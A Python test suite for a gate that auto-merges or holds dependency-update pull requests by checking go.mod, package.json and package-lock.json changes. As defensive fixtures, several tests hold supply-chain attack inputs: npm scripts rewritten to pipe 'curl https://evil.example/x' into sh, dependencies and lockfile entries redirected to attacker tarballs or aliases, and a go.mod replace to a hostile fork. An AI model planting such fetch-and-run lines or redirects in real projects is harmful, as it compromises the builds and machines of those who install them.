        # same version already held.
        sync = "golang.org/x/sync"  # v0.25.0 on both sides of the fixture, indirect, not named
        snapshot = green_gomod()
        set_go_version(snapshot, sync, "v1.0.0-rc.1")
        verdict = self.assert_holds(snapshot, f'go.mod: "{sync}" "v0.25.0" -> "v1.0.0-rc.1" is a step to a pre-release')
        self.assertEqual(verdict["admitted"], [])
        # The release itself is strictly forward and admitted, with the crossing named.
        snapshot = green_gomod()
        set_go_version(snapshot, sync, "v1.0.0")
        self.assert_merges(snapshot, f'go.mod: "{sync}" "v0.25.0" -> "v1.0.0" (an indirect requirement the metadata does not name, strictly newer){CROSSES_V0_V1}')
        # A pseudo-version of v1 too (#194: xo/terminfo pseudo-version -> v1.2.0 is the other direction).
        snapshot = green_gomod()
        set_go_version(snapshot, sync, "v1.0.1-0.20261123000000-abcdefabcdef")
        self.assert_merges(snapshot, CROSSES_V0_V1)
        # Within one major nothing is named.
        snapshot = green_gomod()
        set_go_version(snapshot, sync, "v0.26.0-0.20261123000000-abcdefabcdef")
        verdict = self.assert_merges(snapshot, BY_INDIRECT)
        self.assertTrue(verdict["admitted"][0].endswith(BY_INDIRECT), verdict["admitted"])
        summary = GATE.render_summary(GATE.decide(self.with_version(sync, "v1.0.0")), "decide-only")
        self.assertIn("admitted by indirect-side-effect (crosses v0 to v1)\n", summary)

    @staticmethod
    def with_version(module: str, version: str) -> dict:
        snapshot = green_gomod()
        set_go_version(snapshot, module, version)
        return snapshot

    def test_indirect_rule_needs_an_unnamed_requirement_that_is_indirect_on_every_side(self) -> None:
        # Relaxation (a) is no broader than that: a direct requirement keeps the strict rules.
        snapshot = green_gomod()
        set_go_version(snapshot, "github.com/creack/pty", "v1.1.25-0.20261123000000-abcdefabcdef")
        verdict = self.assert_holds(
            snapshot,
            'go.mod: "github.com/creack/pty" "v1.1.24" -> "v1.1.25-0.20261123000000-abcdefabcdef" is not an update to a released x.y.z version',
            'go.mod changes the direct requirement "github.com/creack/pty", which the dependency metadata does not name',
        )
        self.assertEqual(verdict["admitted"], [])
        # Indirect on one side only: the move holds, and so does the step.
        for side in ("base", "head"):
            with self.subTest(direct_on=side):
                snapshot = green_gomod()
                set_go_version(snapshot, "github.com/cloudflare/circl", "v2.0.0")
                entry = file_entry(snapshot, GO_MOD)
                line = "\tgithub.com/cloudflare/circl v1.6.3 // indirect\n" if side == "base" else "\tgithub.com/cloudflare/circl v2.0.0 // indirect\n"
                self.assertEqual(entry[side].count(line), 1)
                entry[side] = entry[side].replace(line, line.replace(" // indirect", ""))
                verdict = self.assert_holds(snapshot, "between direct and indirect", "is a major update", only=False)
                self.assertEqual(verdict["admitted"], [])

    def test_reordered_or_repeated_other_lines_hold(self) -> None:
        # The lines that are not requirements are compared as a sequence: Go
        # reads `tool`, `replace` and `exclude` lines by block and by order.
        snapshot = green_gomod()
        entry = file_entry(snapshot, GO_MOD)
        lines = entry["head"].split("\n")
        self.assertEqual(lines[:3], ["module github.com/invowk/invowk", "", "go " + lines[2][3:]])
        lines[0], lines[2] = lines[2], lines[0]
        entry["head"] = "\n".join(lines)
        self.assertEqual(sorted(GATE.parse_go_mod(entry["head"])[1]), sorted(GATE.parse_go_mod(entry["base"])[1]))
        self.assert_holds(snapshot, "go.mod changes something other than a requirement's version")
        snapshot = green_gomod()
        entry = file_entry(snapshot, GO_MOD)
        self.assertEqual(entry["head"].count("\ngo "), 1)
        at = entry["head"].index("\ngo ")
        entry["head"] = entry["head"][:at] + entry["head"][at : entry["head"].index("\n", at + 1)] + entry["head"][at:]
        self.assertEqual(set(GATE.parse_go_mod(entry["head"])[1]), set(GATE.parse_go_mod(entry["base"])[1]))
        self.assert_holds(snapshot, "go.mod changes something other than a requirement's version")

    def test_deny_listed_module_changed_as_a_side_effect_holds(self) -> None:
        # golang.org/x/tools is an indirect requirement: Dependabot never
        # names it, but another module's bump can raise it.
        snapshot = green_gomod()
        set_go_version(snapshot, "golang.org/x/tools", "v0.52.1")
        self.assertEqual(go_changes(snapshot), GREEN_GOMOD | {"golang.org/x/tools"})
        self.assert_holds(snapshot, "go.mod changes golang.org/x/tools, which is on the sync-pair deny list")
        # Neither relaxation reaches a deny-listed module: not its 0.x minor
        # (it is under golang.org/x/), not a forward step as a side effect.
        for version in ("v0.53.0", "v0.52.1-0.20261123000000-abcdefabcdef"):
            with self.subTest(version=version):
                snapshot = green_gomod()
                set_go_version(snapshot, "golang.org/x/tools", version)
                verdict = self.assert_holds(snapshot, "go.mod changes golang.org/x/tools, which is on the sync-pair deny list")
                self.assertEqual(verdict["admitted"], [])

    def test_0x_minor_of_a_golang_org_x_module_is_admitted(self) -> None:
        # Relaxation (b), on a direct requirement the metadata names.
        crypto = "golang.org/x/crypto"  # v0.59.0 on both sides of the fixture, direct
        snapshot = green_gomod()
        set_go_version(snapshot, crypto, "v0.60.0")
        add_metadata(snapshot, crypto, "0.60.0")
        verdict = self.assert_merges(snapshot, f'go.mod: "{crypto}" "v0.59.0" -> "v0.60.0" (a minor bump of a 0.x version under golang.org/x/){BY_0X_MINOR}')
        self.assertEqual(len(verdict["dependencies"]), 10)
        self.assertEqual(GATE.RULE_0X_MINOR, "allow-0x-minor")
        # A patch needs no relaxation.
        snapshot = green_gomod()
        set_go_version(snapshot, crypto, "v0.59.1")
        add_metadata(snapshot, crypto, "0.59.1", "version-update:semver-patch")
        self.assert_merges(snapshot)
        # Not named: the 0.x reason is lifted, the direct requirement still has to be named.
        snapshot = green_gomod()
        set_go_version(snapshot, crypto, "v0.60.0")
        verdict = self.assert_holds(snapshot, f'go.mod changes the direct requirement "{crypto}", which the dependency metadata does not name')
        self.assert_admitted(verdict, BY_0X_MINOR)

    def test_0x_minor_rule_lifts_nothing_else(self) -> None:
        # Relaxation (b) is no broader than the one reason.
        crypto = "golang.org/x/crypto"
        cases = {
            ("v0.0.3", "v0.0.4"): ("is a change to a 0.0.z version", "0.0.4 is a 0.0.z version"),
            ("v0.59.0", "v1.0.0"): ("is a major update",),
            ("v0.59.0", "v0.60.0-0.20261123000000-abcdefabcdef"): ("is not an update to a released x.y.z version", "is not a released x.y.z version"),
            ("v0.59.0", "v0.60.0-rc.1"): ("is not an update to a released x.y.z version", "is not a released x.y.z version"),
            ("v0.59.0", "v0.60.0+incompatible"): ("is not an update to a released x.y.z version", "is not a released x.y.z version"),
            ("v0.59.0", "v0.58.0"): ("is a downgrade",),
        }
        for (old, new), reasons in cases.items():
            with self.subTest(old=old, new=new):
                snapshot = green_gomod()
                set_go_version(snapshot, crypto, old, side="base")
                set_go_version(snapshot, crypto, new)
                add_metadata(snapshot, crypto, new.removeprefix("v"))
                verdict = self.assert_holds(snapshot, *reasons)
                self.assertEqual(verdict["admitted"], [])
        # Another module's 0.x minor holds as before (test_minor_bump_of_a_0x_version_holds),
        # and the table is the gomod ecosystem's only.
        self.assertEqual({eco.name: eco.allow_0x_minor for eco in GATE.ECOSYSTEMS}, {"gomod": GATE.ALLOW_0X_MINOR, "npm": {}})
        gomod, npm = GATE.ECOSYSTEMS
        self.assertEqual(GATE._allows_0x_minor(gomod, crypto), "golang.org/x/")
        for eco, module in ((gomod, "golang.org/x/tools"), (gomod, "golang.org/xcrypto"), (gomod, "golang.org/x"), (gomod, "evil.example/golang.org/x/crypto"), (npm, crypto), (None, crypto)):
            with self.subTest(module=module):
                self.assertIsNone(GATE._allows_0x_minor(eco, module))

    def test_0x_minor_of_an_indirect_golang_org_x_module(self) -> None:
        # Relaxation (b) reaches indirect requirements too, named or not;
        # the narrower rule is the one named.
        net = "golang.org/x/net"  # v0.62.0 on both sides of the fixture, indirect
        snapshot = green_gomod()
        set_go_version(snapshot, net, "v0.63.0")
        self.assert_merges(snapshot, f'go.mod: "{net}" "v0.62.0" -> "v0.63.0" (a minor bump of a 0.x version under golang.org/x/){BY_0X_MINOR}')
        add_metadata(snapshot, net, "0.63.0", kind="indirect")
        self.assert_merges(snapshot, f'go.mod: "{net}" "v0.62.0" -> "v0.63.0" (a minor bump of a 0.x version under golang.org/x/){BY_0X_MINOR}')
        # Named, an indirect requirement is outside relaxation (a): a pseudo-version holds.
        set_go_version(snapshot, net, "v0.63.0-0.20261123000000-abcdefabcdef")
        set_metadata_version(snapshot, net, "0.63.0-0.20261123000000-abcdefabcdef")
        self.assert_holds(snapshot, "is not an update to a released x.y.z version", "is not a released x.y.z version")

    def test_anything_but_a_requirement_version_holds(self) -> None:
        changes = {
            "go directive": lambda text: text.replace("\ngo 1.27.4\n", "\ngo 1.27.5\n"),
            "toolchain": lambda text: text.replace("\ngo 1.27.4\n", "\ngo 1.27.4\n\ntoolchain go1.27.5\n"),
            "replace": lambda text: text + "\nreplace github.com/spf13/pflag => github.com/evil/pflag v1.1.0\n",
            "exclude block": lambda text: text + "\nexclude (\n\tgithub.com/spf13/pflag v1.1.0\n)\n",
            "tool": lambda text: text.replace("\ntool (\n", "\ntool (\n\tgithub.com/evil/new/cmd/x\n"),
            "comment in a require block": lambda text: text.replace("require (\n", "require (\n\t// reviewed\n", 1),
            "module path": lambda text: text.replace("module github.com/invowk/invowk\n", "module github.com/evil/invowk\n"),
        }
        for label, change in changes.items():
            with self.subTest(change=label):
                snapshot = green_gomod()
                entry = file_entry(snapshot, GO_MOD)
                changed = change(entry["head"])
                self.assertNotEqual(changed, entry["head"])
                entry["head"] = changed
                self.assert_holds(snapshot, "go.mod changes something other than a requirement's version", only=False)

    def test_require_lines_must_be_requirements(self) -> None:
        # Finding N1 of the PR #197 review, probe P3: a quoted module path is
        # valid go.mod syntax, and Go reads it as the unquoted path. The old
        # reader saw no requirement there, so the deny-listed golang.org/x/tools
        # moved as an "indirect removal" plus a line it did not understand.
        snapshot = green_gomod()
        entry = file_entry(snapshot, GO_MOD)
        self.assertEqual(entry["head"].count("\tgolang.org/x/tools v0.52.0 // indirect\n"), 1)
        entry["head"] = entry["head"].replace("\tgolang.org/x/tools v0.52.0 // indirect\n", '\t"golang.org/x/tools" v0.53.0 // indirect\n')
        verdict = self.assert_holds(snapshot, 'go.mod is not a file this gate can read: "a require line this gate does not read: \'\\"golang.org/x/tools\\" v0.53.0 // indirect\'"')
        self.assertEqual(verdict["admitted"], [])
        lines = {
            "trailing text on a requirement": "\tgithub.com/spf13/pflag v1.1.0 // indirect // x",
            "a replacement on a one-line requirement": "require github.com/evil/new v1.2.3 => x",
            "a quoted one-line requirement": 'require "github.com/evil/new" v1.2.3',
            "no version": "\tgithub.com/evil/new",
            "a space instead of a tab": "    github.com/evil/new v1.2.3",
            "two tabs": "\t\tgithub.com/evil/new v1.2.3",
            "an upper-case domain": "\tGitHub.com/evil/new v1.2.3",
            "a path element of two dots": "\tgithub.com/evil/../new v1.2.3 // indirect",
            "a major element v1": "\tgithub.com/evil/new/v1 v1.2.3 // indirect",
        }
        for label, line in lines.items():
            with self.subTest(line=label):
                snapshot = green_gomod()
                entry = file_entry(snapshot, GO_MOD)
                if line.startswith("require "):
                    entry["head"] = entry["head"].replace("\nrequire (\n", f"\n{line}\n\nrequire (\n", 1)
                else:
                    add_go_line(snapshot, line)
                self.assert_holds(snapshot, "go.mod is not a file this gate can read: \"a require line this gate does not read: ", only=False)
        # The same line on the base side, where the pull request did not write it, holds as well.
        snapshot = green_gomod()
        add_go_line(snapshot, '\t"golang.org/x/tools" v0.52.0 // indirect', side="base")
        self.assert_holds(snapshot, "a require line this gate does not read", only=False)

    def test_module_path_grammar(self) -> None:
        # module.CheckPath, as far as go_module_path_ok follows it.
        valid = (
            "github.com/ProtonMail/go-crypto",
            "4d63.com/gochecknoglobals",
            "dev.gaijin.team/go/exhaustruct/v4",
            "gopkg.in/yaml.v3",
            "gopkg.in/warnings.v0",
            "go.yaml.in/yaml/v2",
            "mvdan.cc/sh/v3",
            "example.com/a_b~c-d.e",
            "example.com/v",
            "example.com/v1x",
            "example.com/x/v10",
            "example.com/-leading-dash-element",
            "example.com/con2",
            "example.com/a~b",
        )
        invalid = (
            '"golang.org/x/tools"',
            "golang.org",  # fine as a path, but listed below with a dot-free first element
            "golang/x/tools",
            "-example.com/x",
            ".example.com/x",
            "example.com./x",
            "Example.com/x",
            "example.com/",
            "example.com//x",
            "example.com/.hidden",
            "example.com/trailing.",
            "example.com/..",
            "example.com/.",
            "example.com/x/v1",
            "example.com/x/v0",
            "example.com/x/v02",
            "example.com/x/v2.0",
            "example.com/a b",
            "example.com/a+b",
            "example.com/a@v1",
            "example.com/café",
            "example.com/con",
            "example.com/CON.txt",
            "example.com/lpt1",
            "example.com/abc~1",
            "example.com/abc~12.d",
            "gopkg.in/yaml",
            "gopkg.in/yaml.v01",
            "",
        )
        for path in valid:
            with self.subTest(path=path):
                self.assertTrue(GATE.go_module_path_ok(path))
        for path in invalid[:1] + invalid[2:]:
            with self.subTest(path=path):
                self.assertFalse(GATE.go_module_path_ok(path))
        self.assertTrue(GATE.go_module_path_ok("golang.org"))
        # Every requirement of the repository's own go.mod is a valid path.
        requirements = GATE.parse_go_mod((ROOT / "go.mod").read_text(encoding="utf-8"))[0]
        self.assertGreater(len(requirements), 250)
        self.assertTrue(all(GATE.go_module_path_ok(module) for module in requirements))

    def test_unreadable_go_mod_holds(self) -> None:
        snapshot = green_gomod()
        add_go_line(snapshot, "\tgithub.com/spf13/pflag v1.1.0")
        self.assert_holds(snapshot, 'go.mod is not a file this gate can read: "github.com/spf13/pflag is required twice"')
        snapshot = green_gomod()
        entry = file_entry(snapshot, GO_MOD)
        entry["head"] = entry["head"][: entry["head"].index("\n)\n")]
        self.assert_holds(snapshot, 'go.mod is not a file this gate can read: "a require block is not closed"')


class PackageJsonRuleTests(GateTestCase):
    """Finding M1: package.json is compared base against head, as JSON."""

    def edit(self, change) -> dict:
        snapshot = green_npm()
        edit_json(snapshot, PACKAGE_JSON, change)
        return snapshot

    def test_script_rewrite_and_url_spec_hold(self) -> None:
        # Attack A7: `scripts.serve` rewritten under a metadata entry named
        # `serve`, and react-dom pointed at a tarball.
        def attack(package: dict) -> None:
            package["scripts"]["serve"] = "docusaurus serve; curl https://evil.example/x | sh"
            package["dependencies"]["react-dom"] = "https://evil.example/react-dom.tgz"

        snapshot = self.edit(attack)
        set_message(snapshot, message_of(snapshot).replace("- dependency-name: react\n", "- dependency-name: serve\n", 1))
        self.assert_holds(
            snapshot,
            "website/package.json changes something other than a dependency's version range",
            'website/package.json: "react-dom" "^19.2.8" -> "https://evil.example/react-dom.tgz" is not a change between plain semver ranges',
            'website/package.json changes "react", which the dependency metadata does not name',
            'the dependency metadata names "serve", but website/package-lock.json does not change the version of "node_modules/serve"',
        )

    def test_any_other_field_holds(self) -> None:
        changes = {
            "script": lambda package: package["scripts"].update(build="curl example.com | sh"),
            "new script": lambda package: package["scripts"].update(postinstall="node x.js"),
            "engines": lambda package: package["engines"].update(node=">=22.0"),
            "private": lambda package: package.update(private=False),
            "overrides": lambda package: package.update(overrides={"react": "npm:evil@1.0.0"}),
            "workspaces": lambda package: package.update(workspaces=["packages/*"]),
            "bundleDependencies": lambda package: package.update(bundleDependencies=["react"]),
            "browserslist": lambda package: package["browserslist"]["production"].pop(),
        }
        for label, change in changes.items():
            with self.subTest(change=label):
                self.assert_holds(self.edit(change), "website/package.json changes something other than a dependency's version range")

    def test_unnamed_dependency_holds(self) -> None:
        snapshot = self.edit(lambda package: package["dependencies"].update(clsx="^2.1.2"))
        self.assert_holds(snapshot, 'website/package.json changes "clsx", which the dependency metadata does not name')

    def test_added_or_removed_dependency_holds(self) -> None:
        self.assertEqual(GATE.DEPENDENCY_SECTIONS, ("dependencies", "devDependencies", "optionalDependencies", "peerDependencies"))
        for section in GATE.DEPENDENCY_SECTIONS:
            with self.subTest(section=section):
                snapshot = self.edit(lambda package: package.setdefault(section, {}).update({"left-pad": "^1.3.0"}))
                self.assert_holds(snapshot, f'website/package.json adds or removes "left-pad" in `{section}`')
        snapshot = self.edit(lambda package: package["dependencies"].pop("clsx"))
        self.assert_holds(snapshot, 'website/package.json adds or removes "clsx" in `dependencies`')

    def test_range_must_be_plain_semver(self) -> None:
        for spec in (
            "https://evil.example/react.tgz",
            "git+https://github.com/evil/react.git",
            "github:evil/react",
            "file:../react",
            "npm:evil-react@^19.3.1",
            "latest",
            "*",
            ">=19.3.1",
            "^19.3.1 || ^20.0.0",
            "^19.3.1 ",
            "^19.3",
            "",
        ):
            with self.subTest(spec=spec):
                snapshot = self.edit(lambda package: package["dependencies"].update(react=spec))
                self.assert_holds(snapshot, f'website/package.json: "react" "^19.2.8" -> {json.dumps(spec)} is not a change between plain semver ranges')
        # The base side too: an update "from" something else is not a version update.
        snapshot = green_npm()
        edit_json(snapshot, PACKAGE_JSON, lambda package: package["dependencies"].update(react="github:react/react"), side="base")
        self.assert_holds(snapshot, "is not a change between plain semver ranges")

    def test_range_operator_must_stay(self) -> None:
        for spec in ("19.3.1", "~19.3.1"):
            with self.subTest(spec=spec):
                snapshot = self.edit(lambda package: package["dependencies"].update(react=spec))
                self.assert_holds(snapshot, f'website/package.json: "react" "^19.2.8" -> "{spec}" changes the range operator')

    def test_range_step_is_classified_by_the_script(self) -> None:
        # The metadata still says react 19.3.1, semver-minor.
        for spec, problem in (("^20.0.0", "is a major update"), ("^19.2.7", "is a downgrade"), ("^19.2.8-rc.1", "is not a change between plain semver ranges")):
            with self.subTest(spec=spec):
                snapshot = self.edit(lambda package: package["dependencies"].update(react=spec))
                self.assert_holds(snapshot, f'website/package.json: "react" "^19.2.8" -> "{spec}" {problem}')
        snapshot = green_npm()
        for side, spec in (("base", "^0.27.0"), ("head", "^0.28.0")):
            edit_json(snapshot, PACKAGE_JSON, lambda package: package["dependencies"].update(react=spec), side=side)
        self.assert_holds(snapshot, 'website/package.json: "react" "^0.27.0" -> "^0.28.0" is a minor bump of a 0.x version')
        self.assert_merges(self.edit(lambda package: package["dependencies"].update(react="^19.2.9")))

    def test_deny_listed_package_changed_in_package_json_holds(self) -> None:
        snapshot = self.edit(lambda package: package["dependencies"].update({"@docusaurus/core": "3.10.3"}))
        self.assert_holds(
            snapshot,
            "website/package.json changes @docusaurus/core, which is on the sync-pair deny list",
            'website/package.json changes "@docusaurus/core", which the dependency metadata does not name',
        )

    def test_unreadable_package_json_holds(self) -> None:
        texts = {
            "not JSON": "{",
            "not an object": "[]",
            "repeated key": '{"scripts": {"build": "x"}, "scripts": {"build": "docusaurus build"}}',
            "repeated nested key": '{"dependencies": {"react": "^19.3.1", "react": "^19.2.8"}}',
            "NaN": '{"version": NaN}',
            "section is a list": '{"dependencies": ["react"]}',
            "range is not a string": '{"dependencies": {"react": {"version": "^19.3.1"}}}',
        }
        for label, text in texts.items():
            for side in ("base", "head"):
                with self.subTest(case=label, side=side):
                    snapshot = green_npm()
                    file_entry(snapshot, PACKAGE_JSON)[side] = text
                    self.assert_holds(snapshot, "website/package.json is not a file this gate can read")


class PackageLockRuleTests(GateTestCase):
    """Finding M1: what `npm ci` on main would install after the merge."""

    REACT = "node_modules/react"

    def edit(self, change, side: str = "head") -> dict:
        snapshot = green_npm()
        if side == "head":
            # A package the metadata does not name, for the tests that need one.
            edit_json(snapshot, PACKAGE_LOCK, lambda lock: lock["packages"].setdefault("node_modules/left-pad", lock_entry("1.3.0")))
        edit_json(snapshot, PACKAGE_LOCK, change, side=side)
        return snapshot

    def test_resolved_must_be_the_npm_registry(self) -> None:
        for resolved in (
            "https://evil.example/react/-/react-19.3.1.tgz",
            "http://registry.npmjs.org/react/-/react-19.3.1.tgz",
            "https://registry.npmjs.org.evil.example/react/-/react-19.3.1.tgz",
            "https://registry.npmjs.org@evil.example/react/-/react-19.3.1.tgz",
            "https://registry.npmjs.org/react/-/react-19.3.1.tgz?x=1",
            "https://registry.npmjs.org/react/-/react-19.3.1.tgz#x",
            "https://registry.npmjs.org/react/-/react-19.3.1.tar",
            " https://registry.npmjs.org/react/-/react-19.3.1.tgz",
            "git+ssh://git@github.com/evil/react.git#abcdef",
            "file:../react",
            None,
            7,
        ):
            with self.subTest(resolved=resolved):
                snapshot = self.edit(lambda lock: lock["packages"][self.REACT].update(resolved=resolved))
                self.assert_holds(snapshot, 'website/package-lock.json: "node_modules/react" resolves from')
        snapshot = self.edit(lambda lock: lock["packages"][self.REACT].pop("resolved"))
        self.assert_holds(snapshot, 'website/package-lock.json: "node_modules/react" resolves from null, not from https://registry.npmjs.org/')

    def test_resolved_must_be_the_tarball_of_the_key_and_version(self) -> None:
        # Finding Medium 2, attack N2: the registry host and a sha512 were
        # enough, so `node_modules/react` could install any registry package.
        for resolved in (
            "https://registry.npmjs.org/evil-pkg/-/evil-pkg-1.0.0.tgz",
            "https://registry.npmjs.org/evil-pkg/-/react-19.3.1.tgz",
            "https://registry.npmjs.org/react/-/evil-pkg-19.3.1.tgz",
            "https://registry.npmjs.org/react/-/react-19.3.0.tgz",
            "https://registry.npmjs.org/react/-/react-19.3.1-rc.1.tgz",
            "https://registry.npmjs.org/@evil/react/-/react-19.3.1.tgz",
            "https://registry.npmjs.org/react-dom/-/react-dom-19.3.1.tgz",
            "https://registry.npmjs.org/react/-/react-19.3.1.tgz/../../../evil-pkg/-/evil-pkg-1.0.0.tgz",
            "https://registry.npmjs.org/React/-/react-19.3.1.tgz",
        ):
            with self.subTest(resolved=resolved):
                snapshot = self.edit(lambda lock: lock["packages"][self.REACT].update(resolved=resolved))
                self.assert_holds(
                    snapshot,
                    f'website/package-lock.json: "node_modules/react" resolves from "{resolved}", not from https://registry.npmjs.org/react/-/react-19.3.1.tgz',
                )
        # The name is the one in the key, the last one of a nested key, with its scope.
        for key, name, good in (
            ("node_modules/left-pad", "left-pad", "https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz"),
            ("node_modules/@scope/left-pad", "@scope/left-pad", "https://registry.npmjs.org/@scope/left-pad/-/left-pad-1.3.0.tgz"),
            ("node_modules/react/node_modules/left-pad", "left-pad", "https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz"),
            ("node_modules/@a/b/node_modules/@scope/left-pad", "@scope/left-pad", "https://registry.npmjs.org/@scope/left-pad/-/left-pad-1.3.0.tgz"),
        ):
            with self.subTest(key=key):
                self.assertEqual(lock_entry("1.3.0", name)["resolved"], good)
                self.assert_merges(self.edit(lambda lock: lock["packages"].update({key: lock_entry("1.3.0", name)})))
                snapshot = self.edit(lambda lock: lock["packages"].update({key: lock_entry("1.3.0", "react")}))
                self.assert_holds(snapshot, f'"{key}" resolves from "https://registry.npmjs.org/react/-/react-1.3.0.tgz", not from {good}')
        self.assertEqual(GATE.registry_tarball("cheerio", "1.0.0-rc.12"), "https://registry.npmjs.org/cheerio/-/cheerio-1.0.0-rc.12.tgz")

    def test_version_must_be_plain_semver(self) -> None:
        for version in ("v19.3.1", "19.3", "19.3.1+build", "latest", "^19.3.1", "", None, 19):
            with self.subTest(version=version):
                snapshot = self.edit(lambda lock: lock["packages"]["node_modules/left-pad"].update(version=version))
                edit_json(snapshot, PACKAGE_LOCK, lambda lock: lock["packages"].update({"node_modules/left-pad": lock_entry("1.3.0")}), side="base")
                self.assert_holds(snapshot, '"node_modules/left-pad" has the version', '"node_modules/left-pad" resolves from')

    def test_alias_holds(self) -> None:
        # Finding Medium 2, attack N5: a `name` field makes the entry install
        # another package under this key. main has two (react-loadable and
        # react-helmet-async); a pull request that changes one waits for a person.
        def alias(lock: dict) -> None:
            lock["packages"]["node_modules/left-pad"] = {**lock_entry("1.0.0", "evil-pkg"), "name": "evil-pkg"}

        snapshot = self.edit(alias)
        self.assert_holds(
            snapshot,
            'website/package-lock.json: "node_modules/left-pad" is an alias of "evil-pkg" (a `name` field)',
            '"node_modules/left-pad" resolves from "https://registry.npmjs.org/evil-pkg/-/evil-pkg-1.0.0.tgz", not from https://registry.npmjs.org/left-pad/-/left-pad-1.0.0.tgz',
        )
        # Even an alias of itself: the field is the hold.
        snapshot = self.edit(lambda lock: lock["packages"]["node_modules/left-pad"].update(name="left-pad"))
        self.assert_holds(snapshot, '"node_modules/left-pad" is an alias of "left-pad"')
        real_lock = json.loads((ROOT / "website" / "package-lock.json").read_text(encoding="utf-8"))["packages"]
        self.assertEqual(sorted(key for key, entry in real_lock.items() if key and "name" in entry), ["node_modules/react-helmet-async", "node_modules/react-loadable"])

    LOADABLE = "node_modules/react-loadable"

    def alias_snapshot(self, base: dict, head: dict | None) -> dict:
        """green_npm with the react-loadable alias entry `base` on main and `head` (None: absent) on the head."""
        snapshot = green_npm()
        edit_json(snapshot, PACKAGE_LOCK, lambda lock: lock["packages"].update({self.LOADABLE: base}), side="base")
        if head is None:
            edit_json(snapshot, PACKAGE_LOCK, lambda lock: lock["packages"].pop(self.LOADABLE, None))
        else:
            edit_json(snapshot, PACKAGE_LOCK, lambda lock: lock["packages"].update({self.LOADABLE: head}))
        return snapshot

    def real_alias(self) -> dict:
        lock = json.loads((ROOT / "website" / "package-lock.json").read_text(encoding="utf-8"))["packages"]
        return copy.deepcopy(lock[self.LOADABLE])

    def test_alias_whose_graph_flags_alone_change_merges(self) -> None:
        # Review Q5 of PR #197: a lockfile refresh that moves an alias
        # main already has between the dev, optional and peer graphs (#193:
        # react-loadable gained or lost `dev`) installs what main installs.
        real = self.real_alias()
        self.assertEqual(real["name"], "@docusaurus/react-loadable")
        for base_flags, head_flags in (
            ({}, {"dev": True}),
            ({}, {"peer": True}),
            ({}, {"optional": True, "devOptional": True}),
            ({"dev": True}, {}),
            ({"dev": True}, {"peer": True}),
            ({"devOptional": True, "optional": True}, {"dev": True}),
        ):
            with self.subTest(base=base_flags, head=head_flags):
                self.assert_merges(self.alias_snapshot({**real, **base_flags}, {**real, **head_flags}))

    def test_alias_changes_other_than_graph_flags_hold(self) -> None:
        real = self.real_alias()
        reason = 'website/package-lock.json: "node_modules/react-loadable" is an alias of "@docusaurus/react-loadable" (a `name` field)'
        cases = {
            "a flag that is not true": {**real, "dev": False},
            "a flag that is a string": {**real, "peer": "true"},
            "a flag that is null": {**real, "optional": None},
            "another license": {**real, "license": "ISC", "dev": True},
            "other dependencies": {**real, "dependencies": {"@types/react": "*", "evil": "1.0.0"}, "dev": True},
            "an install script": {**real, "hasInstallScript": True},
            "another integrity": {**real, "integrity": "sha512-" + "A" * 86 + "=="},
            "another name": {**real, "name": "@evil/react-loadable", "resolved": "https://registry.npmjs.org/@evil/react-loadable/-/react-loadable-6.0.0.tgz"},
            "a new field": {**real, "engines": {"node": ">=18"}},
            "no name": {key: value for key, value in real.items() if key != "name"},
        }
        for label, head in cases.items():
            with self.subTest(case=label):
                verdict = GATE.decide(self.alias_snapshot(real, head))
                self.assertEqual(verdict["decision"], "hold", label)
                if label != "no name":
                    self.assertTrue(any(reason.replace("@docusaurus/react-loadable", head["name"]) in line for line in verdict["reasons"]), verdict["reasons"])
        # Updating the aliased package holds, even to the right tarball.
        head = {
            **real,
            "version": "6.0.1",
            "resolved": "https://registry.npmjs.org/@docusaurus/react-loadable/-/react-loadable-6.0.1.tgz",
        }
        self.assert_holds(self.alias_snapshot(real, head), reason, only=False)
        # A new alias holds, with or without flags.
        for head in (real, {**real, "dev": True}):
            with self.subTest(new=head):
                snapshot = green_npm()
                edit_json(snapshot, PACKAGE_LOCK, lambda lock: lock["packages"].pop(self.LOADABLE, None), side="base")
                edit_json(snapshot, PACKAGE_LOCK, lambda lock: lock["packages"].update({self.LOADABLE: head}))
                self.assert_holds(snapshot, reason, only=False)
        # A non-alias entry of main that gains `name`, flags and all.
        plain = lock_entry("6.0.0", "react-loadable")
        self.assert_holds(self.alias_snapshot(plain, {**plain, "name": "react-loadable", "dev": True}), '"node_modules/react-loadable" is an alias of "react-loadable"')
        # The helper itself: the base must be an object, the head an alias.
        self.assertFalse(GATE._alias_flags_only(real, None))
        self.assertFalse(GATE._alias_flags_only(real, "x"))
        self.assertFalse(GATE._alias_flags_only(plain, plain))
        self.assertTrue(GATE._alias_flags_only({**real, "dev": True}, real))
        self.assertEqual(GATE.NPM_LOCK_FLAGS, ("peer", "dev", "optional", "devOptional"))

    def test_downgrade_holds(self) -> None:
        # Finding Medium 2, attack N3: an entry main has never goes back.
        def base(lock: dict) -> None:
            lock["packages"]["node_modules/left-pad"] = lock_entry("1.3.0")

        for version, problem in (
            ("1.0.0", "a downgrade"),
            ("1.2.9", "a downgrade"),
            ("0.9.0", "a downgrade"),
            ("1.3.0-rc.1", "a downgrade"),
            # Attack N4: another major of a package no one named.
            ("9.0.0", "a major update"),
            ("2.0.0-rc.1", "a major update"),
            ("1.3.1", None),
            ("1.4.0-beta.1", None),
            ("1.99.0", None),
        ):
            with self.subTest(version=version):
                snapshot = self.edit(lambda lock: lock["packages"].update({"node_modules/left-pad": lock_entry(version)}))
                edit_json(snapshot, PACKAGE_LOCK, base, side="base")
                if problem is None:
                    # Within its major, a transitive package is judged by where it comes from.
                    self.assert_merges(snapshot)
                else:
                    self.assert_holds(snapshot, f'website/package-lock.json: "node_modules/left-pad" "1.3.0" -> "{version}" is {problem}')
        # 0.x -> 1.0 is a major too; a 0.x minor of a transitive package is not held (scheduler, in green_npm).
        snapshot = self.edit(lambda lock: lock["packages"].update({"node_modules/left-pad": lock_entry("1.0.0")}))
        edit_json(snapshot, PACKAGE_LOCK, lambda lock: lock["packages"].update({"node_modules/left-pad": lock_entry("0.9.0")}), side="base")
        self.assert_holds(snapshot, '"node_modules/left-pad" "0.9.0" -> "1.0.0" is a major update')
        # A new entry has no step: a package enters the tree at whatever major its parent asks for.
        self.assert_merges(self.edit(lambda lock: lock["packages"].update({"node_modules/left-pad": lock_entry("9.0.0")})))
        # The same version with another field changed is not a step at all.
        snapshot = self.edit(lambda lock: lock["packages"].update({"node_modules/left-pad": lock_entry("1.3.0", dev=True)}))
        edit_json(snapshot, PACKAGE_LOCK, base, side="base")
        self.assert_merges(snapshot)
